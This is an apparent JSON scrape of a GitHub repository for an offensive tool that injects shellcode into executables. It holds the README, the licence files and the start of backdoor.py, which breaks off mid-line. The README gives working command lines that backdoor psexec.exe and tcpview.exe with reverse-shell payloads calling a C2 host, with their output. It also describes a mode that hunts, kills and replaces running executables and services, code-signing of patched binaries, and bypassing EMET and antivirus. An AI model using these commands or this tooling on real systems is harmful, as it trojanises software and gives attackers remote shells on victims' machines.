{
  "metadata": {
    "timestamp": 1736560053004,
    "page": 877,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjg4MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "secretsquirrel/the-backdoor-factory",
      "stars": 3334,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.01171875,
          "content": "*.pyc\n*.exe\n"
        },
        {
          "name": "COPYING",
          "type": "blob",
          "size": 1.4853515625,
          "content": "Copyright (C) 2013-2014, Joshua Pitts\nAll rights reserved.\n\n\nRedistribution and use in source and binary forms, with or without modification,\nare permitted provided that the following conditions are met:\n\n    1. Redistributions of source code must retain the above copyright notice,\n    this list of conditions and the following disclaimer.\n\n    2. Redistributions in binary form must reproduce the above copyright notice,\n    this list of conditions and the following disclaimer in the documentation\n    and/or other materials provided with the distribution.\n\n    3. Neither the name of the copyright holder nor the names of its contributors\n    may be used to endorse or promote products derived from this software without\n    specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\nAND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\nIMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\nARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE\nLIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\nCONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\nSUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\nINTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\nCONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\nARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\nPOSSIBILITY OF SUCH DAMAGE.\n"
        },
        {
          "name": "LICENSE.txt",
          "type": "blob",
          "size": 1.484375,
          "content": "Copyright (c) 2013-2016, Joshua Pitts\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without modification,\nare permitted provided that the following conditions are met:\n\n    1. Redistributions of source code must retain the above copyright notice,\n    this list of conditions and the following disclaimer.\n\n    2. Redistributions in binary form must reproduce the above copyright notice,\n    this list of conditions and the following disclaimer in the documentation\n    and/or other materials provided with the distribution.\n\n    3. Neither the name of the copyright holder nor the names of its contributors\n    may be used to endorse or promote products derived from this software without\n    specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\nAND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\nIMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\nARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE\nLIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\nCONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\nSUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\nINTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\nCONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\nARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\nPOSSIBILITY OF SUCH DAMAGE.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 14.6552734375,
          "content": "\n# The new version of BACKDOOR FACTORY is available! Get access here: https://github.com/sponsors/secretsquirrel\n\n# WARNING: Pull Requests WILL BE IGNORED AND CLOSED.\n\n## The Backdoor Factory (BDF)\n\nFor security professionals and researchers only.\n\nThe goal of BDF is to patch executable binaries with user desired shellcode and continue normal execution of the prepatched state.\n\n[![Join the chat at https://gitter.im/secretsquirrel/the-backdoor-factory](https://badges.gitter.im/secretsquirrel/the-backdoor-factory.svg)](https://gitter.im/secretsquirrel/the-backdoor-factory?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)  [![Black Hat Arsenal](https://www.toolswatch.org/badges/arsenal/2015.svg)](https://www.blackhat.com/us-15/arsenal.html)\n\nBlack Hat USA 2015:\n\n    Video: https://www.youtube.com/watch?v=OuyLzkG16Uk\n    \n    Paper: https://www.blackhat.com/docs/us-15/materials/us-15-Pitts-Repurposing-OnionDuke-A-Single-Case-Study-Around-Reusing-Nation-State-Malware-wp.pdf\n\n\nShmoocon 2015:\n    \n    Video: https://archive.org/details/joshpitts_shmoocon2015\n\n    Paper: https://www.dropbox.com/s/te7e35c8xcnyfzb/JoshPitts-UserlandPersistenceOnMacOSX.pdf\n\n\nDerbyCon 2014: \n\n    Video: http://www.youtube.com/watch?v=LjUN9MACaTs\n\n\nDerbyCon 2013: \n    \n    Video: http://www.youtube.com/watch?v=jXLb2RNX5xs\n\n    Injection Module Demo: http://www.youtube.com/watch?v=04aJAex2o3U\n\n    Slides: http://www.slideshare.net/midnite_runr/patching-windows-executables-with-the-backdoor-factory\n\n\nContact the developer on:\n  \n    IRC:\n    irc.freenode.net #BDFactory \n\n    Twitter:\n    @midnite_runr\n\n\nUnder a BSD 3 Clause License\n\nSee the wiki: https://github.com/secretsquirrel/the-backdoor-factory/wiki\n\n---\n## Installing\n\n### DOCKER\n```\ndocker pull secretsquirrel/the-backdoor-factory\ndocker run -it secretsquirrel/the-backdoor-factory bash\n# ./backdoor.py\n```\n\n###OLD SCHOOL\n\n####Dependences\n#####*To use OnionDuke you MUST be on an intel machine because aPLib has no support for the ARM chipset yet.*\n\n\n[Capstone engine](http://www.capstone-engine.org) can be installed from PyPi with:\n\n    sudo pip install capstone\n\nPefile, most recent:\n    \n    https://code.google.com/p/pefile/\n\nosslsigncode (included in repo): \n    \n    http://sourceforge.net/p/osslsigncode/osslsigncode/ci/master/tree/\n\nKali Install:\n\n      apt-get update\n      apt-get install backdoor-factory\n\n\nOther *NIX/MAC INSTALL:\n\n    ./install.sh\n\nThis will install Capstone with 3.01 pip to install pefile.\n\nUPDATE:\n\n    ./update.sh\n\n\n---\n\nSupporting: \n\n    Windows PE x86/x64,ELF x86/x64 (System V, FreeBSD, ARM Little Endian x32), \n    and Mach-O x86/x64 and those formats in FAT files\n    \n    Packed Files: PE UPX x86/x64\n    \n    Experimental: OpenBSD x32 \n\n\nSome executables have built in protections, as such this will not work on all binaries.  It is advisable that you test target binaries before deploying them to clients or using them in exercises.  I'm on the verge of bypassing NSIS, so bypassing these checks will be included in the future.\n\n    Many thanks to Ryan O'Neill --ryan 'at' codeslum <d ot> org--\n    Without him, I would still be trying to do stupid things \n    with the elf format.\n    Also thanks to Silvio Cesare with his 1998 paper \n    (http://vxheaven.org/lib/vsc01.html) which these ELF patching\n    techniques are based on.\n\n\n\nRecently tested on many binaries.\n---\n\n./backdoor.py -h \n    Usage: backdoor.py [options]\n\n    \n---\n\n##Features:\n\n###PE Files\n\n    Can find all codecaves in an EXE/DLL.\n    By default, clears the pointer to the PE certificate table, thereby unsigning a binary.\n    Can inject shellcode into code caves or into a new section.\n    Can find if a PE binary needs to run with elevated privileges.\n    When selecting code caves, you can use the following commands:\n      -Jump (j), for code cave jumping\n      -Single (s), for patching all your shellcode into one cave\n      -Append (a), for creating a code cave\n      -Ignore (i or q), nevermind, ignore this binary\n    Can ignore DLLs\n    Import Table Patching\n    AutoPatching (-m automtic)\n    Onionduke (-m onionduke)\n\n###ELF Files\n\n    Extends 1000 bytes (in bytes) to the TEXT SEGMENT and injects shellcode into that section of code.\n\n###Mach-O Files\n    Pre-Text Section patching and signature removal\n\n###Overall\n    \n    The user can :\n      -Provide custom shellcode.\n      -Patch a directory of executables/dlls.\n      -Select x32 or x64 binaries to patch only.\n      -Include BDF is other python projects see pebin.py and elfbin.py\n\n---------------------------------------------\n\nSample Usage:\n---\n\n###Patch an exe/dll using an existing code cave:\n\n    ./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp \n\n    [*] In the backdoor module\n    [*] Checking if binary is supported\n    [*] Gathering file info\n    [*] Reading win32 entry instructions\n    [*] Looking for and setting selected shellcode\n    [*] Creating win32 resume execution stub\n    [*] Looking for caves that will fit the minimum shellcode length of 402\n    [*] All caves lengths:  (402,)\n    ############################################################\n    The following caves can be used to inject code and possibly\n    continue execution.\n    **Don't like what you see? Use jump, single, append, or ignore.**\n    ############################################################\n    [*] Cave 1 length as int: 402\n    [*] Available caves:\n    1. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2e4d5 End: 0x2e6d0; Cave Size: 507\n    2. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2e6e9 End: 0x2e8d5; Cave Size: 492\n    3. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2e8e3 End: 0x2ead8; Cave Size: 501\n    4. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2eaf1 End: 0x2ecdd; Cave Size: 492\n    5. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2ece7 End: 0x2eee0; Cave Size: 505\n    6. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2eef3 End: 0x2f0e5; Cave Size: 498\n    7. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2f0fb End: 0x2f2ea; Cave Size: 495\n    8. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2f2ff End: 0x2f4f8; Cave Size: 505\n    9. Section Name: .data; Section Begin: 0x2e400 End: 0x30600; Cave begin: 0x2f571 End: 0x2f7a0; Cave Size: 559\n    10. Section Name: .rsrc; Section Begin: 0x30600 End: 0x5f200; Cave begin: 0x5b239 End: 0x5b468; Cave Size: 559\n    **************************************************\n    [!] Enter your selection: 5\n    Using selection: 5\n    [*] Changing Section Flags\n    [*] Patching initial entry instructions\n    [*] Creating win32 resume execution stub\n    [*] Overwriting certificate table pointer\n    [*] psexec.exe backdooring complete\n    File psexec.exe is in the 'backdoored' directory\n\n---\n\n###Patch an exe/dll by adding a code section:\n\n    ./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a \n    [*] In the backdoor module\n    [*] Checking if binary is supported\n    [*] Gathering file info\n    [*] Reading win32 entry instructions\n    [*] Looking for and setting selected shellcode\n    [*] Creating win32 resume execution stub\n    [*] Creating Code Cave\n    - Adding a new section to the exe/dll for shellcode injection\n    [*] Patching initial entry instructions\n    [*] Creating win32 resume execution stub\n    [*] Overwriting certificate table pointer\n    [*] psexec.exe backdooring complete\n    File psexec.exe is in the 'backdoored' directory\n\n---\n\n###Patch a directory of exes:\n    ./backdoor.py -d test/ -i 192.168.0.100 -p 8080 -s reverse_shell_tcp -a\n    ...output too long for README...\n\n---\n\n###User supplied shellcode:\n    msfpayload windows/exec CMD='calc.exe' R > calc.bin\n    ./backdoor.py -f psexec.exe -s user_supplied_shellcode -U calc.bin\n    This will pop calc.exe on a target windows workstation. So 1337. Much pwn. Wow.\n\n---\n###PEcodeSigning\n\nBDF can sign PE files if you have a codesigning cert. It uses osslsigncode.\nPut your signing cert and private key in the certs/ directory.  Prep your certs using openssl commands from this blog post:\nhttp://secureallthethings.blogspot.com/2015/12/add-pe-code-signing-to-backdoor-factory.html\n\nPut your private key password in a file (gasp) as so (exactly as so): \n    \n    echo -n yourpassword > certs/passFile.txt\n\nName your certs EXACTLY as follows:\n\t\n    signingCert.cer => certs/signingCert.cer\n    signingPrivateKey.pem => certs/signingPrivateKey.pem\n\nYour certs/ directory should look excatly as so:\n    \n    certs\n    ├── passFile.txt\n    ├── signingPrivateKey.pem\n    └── signingCert.cer\n\nEnable PE Code Signing with the -C flag as so:\n\n     ./backdoor.py -f tcpview.exe -s iat_reverse_tcp_inline -H 172.16.186.1 -P 8080 -m automatic -C\n\n\nOn successful run you should see this line in BDF output:\n\n    [*] Code Signing Succeeded\n\n\n\n---\n###Hunt and backdoor: Injector | Windows Only\n    The injector module will look for target executables to backdoor on disk.  It will check to see if you have identified the target as a service, check to see if the process is running, kill the process and/or service, inject the executable with the shellcode, save the original file to either file.exe.old or another suffix of choice, and attempt to restart the process or service.  \n    Edit the python dictionary \"list_of_targets\" in the 'injector' module for targets of your choosing.\n\n    ./backdoor.py -i -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a -u .moocowwow \n\n---\n\n###Changelog\n\n####01/11/2016\n\n* Fix entry point truncation bug that led to improper recovery in rare instances\n\n\n####07/04/2016\n\n* Support for dynamic paths in BDFProxy for preprocessor\n\n####06/19/2016\n\n* Added the preprocessor and other optimizations\n* The preprocessor allows the user to modify the binary prior to payload injection\n* Invoke with the -p flag\n* See samples in ./preprocessor/\n\n\n####12/20/2015\n\n * Added directory paths to BDF to find certs directory.\n\n\n####12/18/2015\n * Added PE codesiging support.  You must provide your own codesigning cert. See here: https://github.com/secretsquirrel/the-backdoor-factory#pecodesigning\n\n####11/17/2015\n\n * Bug fix in rsrc section for onionduke patching and remove of random win32 version value in PE Header\n\n####11/13/2015\n  * Added proper truncating of a PE file after signature pointer is cleared in PE header - e.g. proper unsigning.  Resulting in better support for IAT patching\n\n####10/19/2015\n  * Fixed bug in IAT directory cave assignment that caused BDF crash\n  * Made the feature optional with -A flag\n\n####10/13/2015\n   * Changed the Import Table Directory modifications from adding a new section to using an existing code cave\n\n\n####08/12/2015\n   * Added 'replace' PATCH_METHOD - a straight PE copy pasta of the supplied binary\n   * More for usage with BDFProxy\n\n        Usage: ./backdoor.py -f weee.exe -m replace -b supplied_binary.exe\n\n####08/11/2015\n   * Stability fix for auto cave selection for rare caves of overlap\n\n####08/05/2015\n    \n   * BH USA UPDATES, w00t!\n   * OnionDuke, use -m onionduke\n    * Supports user supplied exe's and dll's\n    * Usage: ./backdoor.py -f originalfile.exe -m onionduke -b pentest.dll/exe \n   * XP MODE = Prior IAT based payloads did not support XP, Wine, or Windows 98.  If you need to support XP use the -X flag. I'm not supporting anything less than XP (and not XP x64).\n   * Invoke UAC prompt to runas as admin. *experimental* - patches the PE manifest if requestedExecutionLevel exists.\n   * Stability updates:\n  \t* Fixed a bug with incorrect RVA calculation jmp'ing across 2+ code caves \n  \t* Better checks to determine if a new section for the IAT will write into appended data and therefore fail\n   * Speed Improvements:\n    * Faster code cave finding while using *automatic* mode (-m automatic)\n    * Faster rsrc parsing to find manifest file \n\n####5/01/2015\n\n   * Bug fix to the reverse_tcp_stager_threaded payload when using single caves payload\n\n####4/28/2015\n\n   * Adding check for Bound Imports (PE files with bound imports will not be patched)\n\n####4/14/2015\n\nSo many updates:\n  * Automatic patching for PE files (use -m automatic with a *_threaded payload)\n  \n  * New IAT payloads for x86/x64 PE files\n\n  * Just watch: https://www.youtube.com/watch?v=kkLI_ur6BxY\n\n####2/14/2015\nI <3 you guys\n\n* Added Import Address Table patching for PEs to support iat_reverse_tcp payloads that \nuse the import table for winAPI calls. If the binary you are patching does not\nhave LoadLibraryA and GetProcAddress, for example, BDF will patch it in to a \nnew Import Table in a new section. Supports x64/x86 PEs.\n\n* Added iat_reverse_tcp for x64 PEs.\n\n* Bug fixes and improvements\n\n####1/1/2015\n\nHappy New Year!\n\nTwo new OS X payloads! The delay: delay_reverse_shell_tcp\n\n-B 30 --> delay the payload for 30 seconds, main code runs right away.\n\nSetting of firm capstone commit for building into BDF, capstone 'Next' repo\nbreaks BDF.\n\nFixes to support cython capstone implementation null byte truncation issue\n\n\n####12/27/2014\n\nAdded payloadtests.py\n\nThis script will output patched files in backdoored that will allow for the user to \ntest the payloads as they wish. Each payload type increments the port used\nby one.\n\n\n    Usage: payloadtest.py binary HOST PORT\n  \n\n####12/17/2014\n\nOS X Beaconing Payloads for x86 and x64: beaconing_reverse_shell_tcp \n\n-B 15  --> set beacon time for 15 secs\n\nBug fix to support OS X for BDFProxy\n\n\n\n####10/11/2014\n\nPE UPX Patching Added\n\n\n\n####9/26/2014\n\nMach-O x86/x64 added\n\nx86 IAT payload optimization\n\n\n\n####7/31/2014 \n\nAdded support for ARM x32 LE ELF patching\n\n\n\n####7/22/2014 \n\nAdded FreeBSD x32 ELF patching support\n\nChange to BSD 3 Clause License\n\n\n\n####7/13/2014 \n\nIncorporated Capstone: http://www.capstone-engine.org/\n\nDuring the process of adding Capstone, I removed about 500 lines of code. That's pretty awesome.\n\nRenamed loadliba_reverse_tcp to iat_reverse_tcp.\n\nSmall optimizations for speed.\n\n\n\n####5/30/2014 \n\nAdded a new win86 shellcode: loadliba_reverse_tcp\n    \n  - Based on the following research by Jared DeMott: http://bromiumlabs.files.wordpress.com/2014/02/bypassing-emet-4-1.pdf -- Thanks @bannedit0 for mentioning this.\n  - This shellcode uses LoadLibraryA and GetProcAddress APIs to find all necessary APIs for a reverse TCP connection. No more of Stephen Fewers API hash lookup (which is still brilliant).\n  - It's not stealthy. It's position dependent. But the results are great (code cave jumping): https://www.virustotal.com/en/file/a31ed901abcacd61a09a84157887fc4a189d3fe3e3573c24e776bac8d5bb8a0f/analysis/1401385796/\n  - Bypasses EMET 4.1. The caller protection doesn't catch it.\n  - As such, I'll be furthering this idea with an algo that patches the binary with custom shellcode based on the APIs that are in the IAT. Including porting the current win86 shellcodes to this idea.\n\n---\n"
        },
        {
          "name": "__init__.py",
          "type": "blob",
          "size": 0,
          "content": ""
        },
        {
          "name": "aPLib",
          "type": "tree",
          "content": null
        },
        {
          "name": "arm",
          "type": "tree",
          "content": null
        },
        {
          "name": "asm",
          "type": "tree",
          "content": null
        },
        {
          "name": "backdoor.py",
          "type": "blob",
          "size": 30.798828125,
          "content": "#!/usr/bin/env python2\n'''\nBackdoorFactory (BDF) v3 - FOUNTAINPATCH\n\nMany thanks to Ryan O'Neill --ryan 'at' codeslum <d ot> org--\nWithout him, I would still be trying to do stupid things\nwith the elf format.\n\nAlso thanks to Silvio Cesare with his 1998 paper\n(http://vxheaven.org/lib/vsc01.html) which these ELF patching\ntechniques are based on.\n\nSpecial thanks to Travis Morrow for poking holes in my ideas.\n\nCopyright (c) 2013-2017, Joshua Pitts\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without modification,\nare permitted provided that the following conditions are met:\n\n    1. Redistributions of source code must retain the above copyright notice,\n    this list of conditions and the following disclaimer.\n\n    2. Redistributions in binary form must reproduce the above copyright notice,\n    this list of conditions and the following disclaimer in the documentation\n    and/or other materials provided with the distribution.\n\n    3. Neither the name of the copyright holder nor the names of its contributors\n    may be used to endorse or promote products derived from this software without\n    specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\nAND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\nIMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\nARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE\nLIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\nCONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\nSUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\nINTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN\nCONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)\nARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\nPOSSIBILITY OF SUCH DAMAGE.\n\n'''\n\nimport sys\nimport os\nimport signal\nimport time\nfrom random import choice\nfrom optparse import OptionParser\nfrom pebin import pebin\nfrom elfbin import elfbin\nfrom machobin import machobin\n\n\ndef signal_handler(signal, frame):\n        print '\\nProgram Exit'\n        sys.exit(0)\n\n\nclass bdfMain():\n\n    version = \"\"\"\\\n         Version:   3.4.2\n         \"\"\"\n\n    author = \"\"\"\\\n         !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n         ALERT: NEW VERSION Available \n         *** ONLY AVAILABLE TO SPONSORS ***\n         SPONSOR HERE: https://github.com/sponsors/secretsquirrel\n         Author:    Joshua Pitts\n         Email:     the.midnite.runr[-at ]gmail<d o-t>com\n         Twitter:   @ausernamedjosh\n         !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n         \"\"\"\n\n    #ASCII ART\n    menu = [\"-.(`-')  (`-')  _           <-\"\n            \".(`-') _(`-')                            (`-')\\n\"\n            \"__( OO)  (OO ).-/  _         __( OO)\"\n            \"( (OO ).->     .->        .->   <-.(OO )  \\n\"\n            \"'-'---.\\  / ,---.   \\-,-----.'-'. ,--\"\n            \".\\    .'_ (`-')----. (`-')----. ,------,) \\n\"\n            \"| .-. (/  | \\ /`.\\   |  .--./|  .'   /\"\n            \"'`'-..__)( OO).-.  '( OO).-.  '|   /`. ' \\n\"\n            \"| '-' `.) '-'|_.' | /_) (`-')|      /)\"\n            \"|  |  ' |( _) | |  |( _) | |  ||  |_.' | \\n\"\n            \"| /`'.  |(|  .-.  | ||  |OO )|  .   ' |\"\n            \"  |  / : \\|  |)|  | \\|  |)|  ||  .   .' \\n\"\n            \"| '--'  / |  | |  |(_'  '--'\\|  |\\   \\|\"\n            \"  '-'  /  '  '-'  '  '  '-'  '|  |\\  \\  \\n\"\n            \"`------'  `--' `--'   `-----'`--' '--'\"\n            \"`------'    `-----'    `-----' `--' '--' \\n\"\n            \"           (`-')  _           (`-')     \"\n            \"              (`-')                    \\n\"\n            \"   <-.     (OO ).-/  _        ( OO).-> \"\n            \"      .->   <-.(OO )      .->           \\n\"\n            \"(`-')-----./ ,---.   \\-,-----./    '._\"\n            \"  (`-')----. ,------,) ,--.'  ,-.        \\n\"\n            \"(OO|(_\\---'| \\ /`.\\   |  .--./|'--...__)\"\n            \"( OO).-.  '|   /`. '(`-')'.'  /        \\n\"\n            \" / |  '--. '-'|_.' | /_) (`-')`--.  .--'\"\n            \"( _) | |  ||  |_.' |(OO \\    /         \\n\"\n            \" \\_)  .--'(|  .-.  | ||  |OO )   |  |   \"\n            \" \\|  |)|  ||  .   .' |  /   /)         \\n\"\n            \"  `|  |_)  |  | |  |(_'  '--'\\   |  |    \"\n            \" '  '-'  '|  |\\  \\  `-/   /`          \\n\"\n            \"   `--'    `--' `--'   `-----'   `--'    \"\n            \"  `-----' `--' '--'   `--'            \\n\",\n\n            \"__________               \"\n            \" __       .___                   \\n\"\n            \"\\______   \\_____    ____ \"\n            \"|  | __ __| _/____   ___________ \\n\"\n            \" |    |  _/\\__  \\ _/ ___\\|\"\n            \"  |/ // __ |/  _ \\ /  _ \\_  __ \\ \\n\"\n            \" |    |   \\ / __ \\\\\\\\  \\__\"\n            \"_|    </ /_/ (  <_> |  <_> )  | \\/\\n\"\n            \" |______  /(____  /\\___  >\"\n            \"__|_ \\____ |\\____/ \\____/|__|   \\n\"\n            \"        \\/      \\/     \\/\"\n            \"     \\/    \\/                    \\n\"\n            \"___________              \"\n            \"__                               \\n\"\n            \"\\_   _____/____    _____/\"\n            \"  |_  ___________ ___.__.        \\n\"\n            \" |    __) \\__  \\ _/ ___\\ \"\n            \"  __\\/  _ \\_  __ <   |  |        \\n\"\n            \" |     \\   / __ \\\\\\\\  \\__\"\n            \"_|  | (  <_> )  | \\/\\___  |        \\n\"\n            \" \\___  /  (____  /\\___  >_\"\n            \"_|  \\____/|__|   / ____|        \\n\"\n            \"     \\/        \\/     \\/  \"\n            \"                 \\/             \\n\",\n\n            \"    ____  ____  ______  \"\n            \"         __      \\n\"\n            \"   / __ )/ __ \\/ ____/___ \"\n            \"______/ /_____  _______  __\\n\"\n            \"  / __  / / / / /_  / __ `/\"\n            \" ___/ __/ __ \\/ ___/ / / /\\n\"\n            \" / /_/ / /_/ / __/ / /_/ /\"\n            \" /__/ /_/ /_/ / /  / /_/ /\\n\"\n            \"/_____/_____/_/    \\__,_/\"\n            \"\\___/\\__/\\____/_/   \\__, /\\n\"\n            \"                         \"\n            \"                   /____/\\n\"]\n\n    signal.signal(signal.SIGINT, signal_handler)\n\n    parser = OptionParser()\n    parser.add_option(\"-f\", \"--file\", dest=\"FILE\", action=\"store\",\n                      type=\"string\",\n                      help=\"File to backdoor\")\n    parser.add_option(\"-s\", \"--shell\", default=\"show\", dest=\"SHELL\",\n                      action=\"store\", type=\"string\",\n                      help=\"Payloads that are available for use.\"\n                      \" Use 'show' to see payloads.\"\n                      )\n    parser.add_option(\"-H\", \"--hostip\", default=None, dest=\"HOST\",\n                      action=\"store\", type=\"string\",\n                      help=\"IP of the C2 for reverse connections.\")\n    parser.add_option(\"-P\", \"--port\", default=None, dest=\"PORT\",\n                      action=\"store\", type=\"int\",\n                      help=\"The port to either connect back to for reverse \"\n                      \"shells or to listen on for bind shells\")\n    parser.add_option(\"-J\", \"--cave_jumping\", dest=\"CAVE_JUMPING\",\n                      default=False, action=\"store_true\",\n                      help=\"Select this options if you want to use code cave\"\n                      \" jumping to further hide your shellcode in the binary.\"\n                      )\n    parser.add_option(\"-a\", \"--add_new_section\", default=False,\n                      dest=\"ADD_SECTION\", action=\"store_true\",\n                      help=\"Mandating that a new section be added to the \"\n                      \"exe (better success) but less av avoidance\")\n    parser.add_option(\"-U\", \"--user_shellcode\", default=None,\n                      dest=\"SUPPLIED_SHELLCODE\", action=\"store\",\n                      help=\"User supplied shellcode, make sure that it matches\"\n                      \" the architecture that you are targeting.\"\n                      )\n    parser.add_option(\"-c\", \"--cave\", default=False, dest=\"FIND_CAVES\",\n                      action=\"store_true\",\n                      help=\"The cave flag will find code caves that \"\n                      \"can be used for stashing shellcode. \"\n                      \"This will print to all the code caves \"\n                      \"of a specific size.\"\n                      \"The -l flag can be use with this setting.\")\n    parser.add_option(\"-l\", \"--shell_length\", default=380, dest=\"SHELL_LEN\",\n                      action=\"store\", type=\"int\",\n                      help=\"For use with -c to help find code \"\n                      \"caves of different sizes\")\n    parser.add_option(\"-o\", \"--output-file\", default=None, dest=\"OUTPUT\",\n                      action=\"store\", type=\"string\",\n                      help=\"The backdoor output file\")\n    parser.add_option(\"-n\", \"--section\", default=\"sdata\", dest=\"NSECTION\",\n                      action=\"store\", type=\"string\",\n                      help=\"New section name must be \"\n                      \"less than seven characters\")\n    parser.add_option(\"-d\", \"--directory\", dest=\"DIR\", action=\"store\",\n                      type=\"string\",\n                      help=\"This is the location of the files that \"\n                      \"you want to backdoor. \"\n                      \"You can make a directory of file backdooring faster by \"\n                      \"forcing the attaching of a codecave \"\n                      \"to the exe by using the -a setting.\")\n    parser.add_option(\"-w\", \"--change_access\", default=True,\n                      dest=\"CHANGE_ACCESS\", action=\"store_false\",\n                      help=\"This flag changes the section that houses \"\n                      \"the codecave to RWE. Sometimes this is necessary. \"\n                      \"Enabled by default. If disabled, the \"\n                      \"backdoor may fail.\")\n    parser.add_option(\"-i\", \"--injector\", default=False, dest=\"INJECTOR\",\n                      action=\"store_true\",\n                      help=\"This command turns the backdoor factory in a \"\n                      \"hunt and shellcode inject type of mechanism. Edit \"\n                      \"the target settings in the injector module.\")\n    parser.add_option(\"-u\", \"--suffix\", default=\".old\", dest=\"SUFFIX\",\n                      action=\"store\", type=\"string\",\n                      help=\"For use with injector, places a suffix\"\n                      \" on the original file for easy recovery\")\n    parser.add_option(\"-D\", \"--delete_original\", dest=\"DELETE_ORIGINAL\",\n                      default=False, action=\"store_true\",\n                      help=\"For use with injector module.  This command\"\n                      \" deletes the original file.  Not for use in production \"\n                      \"systems.  *Author not responsible for stupid uses.*\")\n    parser.add_option(\"-O\", \"--disk_offset\", dest=\"DISK_OFFSET\", default=0,\n                      type=\"int\", action=\"store\",\n                      help=\"Starting point on disk offset, in bytes. \"\n                      \"Some authors want to obfuscate their on disk offset \"\n                      \"to avoid reverse engineering, if you find one of those \"\n                      \"files use this flag, after you find the offset.\")\n    parser.add_option(\"-S\", \"--support_check\", dest=\"SUPPORT_CHECK\",\n                      default=False, action=\"store_true\",\n                      help=\"To determine if the file is supported by BDF prior\"\n                      \" to backdooring the file. For use by itself or with \"\n                      \"verbose. This check happens automatically if the \"\n                      \"backdooring is attempted.\"\n                      )\n    parser.add_option(\"-M\", \"--cave-miner\", dest=\"CAVE_MINER\", default=False, action=\"store_true\",\n                      help=\"Future use, to help determine smallest shellcode possible in a PE file\"\n                      )\n    parser.add_option(\"-q\", \"--no_banner\", dest=\"NO_BANNER\", default=False, action=\"store_true\",\n                      help=\"Kills the banner.\"\n                      )\n    parser.add_option(\"-v\", \"--verbose\", default=False, dest=\"VERBOSE\",\n                      action=\"store_true\",\n                      help=\"For debug information output.\")\n    parser.add_option(\"-T\", \"--image-type\", dest=\"IMAGE_TYPE\", default=\"ALL\",\n                      type='string',\n                      action=\"store\", help=\"ALL, x86, or x64 type binaries only. Default=ALL\")\n    parser.add_option(\"-Z\", \"--zero_cert\", dest=\"ZERO_CERT\", default=True, action=\"store_false\",\n                      help=\"Allows for the overwriting of the pointer to the PE certificate table\"\n                      \" effectively removing the certificate from the binary for all intents\"\n                      \" and purposes.\"\n                      )\n    parser.add_option(\"-R\", 